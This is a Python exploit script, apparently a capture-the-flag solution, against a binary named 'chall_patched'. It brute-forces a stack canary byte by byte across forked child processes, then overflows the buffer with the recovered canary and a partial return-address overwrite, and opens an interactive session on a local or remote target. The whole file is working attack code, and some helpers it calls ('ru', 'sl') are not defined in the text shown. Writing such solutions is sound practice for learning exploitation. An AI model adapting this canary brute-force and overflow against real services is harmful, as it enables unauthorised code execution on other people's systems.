#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./chall_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
set follow-fork-mode child
brva 0x125C
# brva 0x1382
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

# ==================== EXPLOIT ====================
p = start()

'''
Subtract problem each time the program forks (The while loop will end if there is no problem left).
If we overwrite the canary, the child process will exit and not return any value.
So that means we can only send 4 payloads before we need to send a newline to continue.
'''

count = 1
canary = b"\x00"
padding = b'A' * 24

while len(canary) < 8:
    for b in range(0x100):
        if b == ord("\n"):
            continue
        payload = padding + canary + b.to_bytes(1, "little")

        count -= 1
        if count == 0:
            p.sendline()
            count += 4
        else:
            p.clean()
            p.sendline(payload)

            if b"..." in ru(b"What do you do?"):
                canary += b.to_bytes(1, "little")
                print(f"Canary byte found: {bytes([b]).hex()}")
                break


# print(canary)
sl(b'A' * 0x18 + canary + p64(0) + p8(0xd6))

interactive()
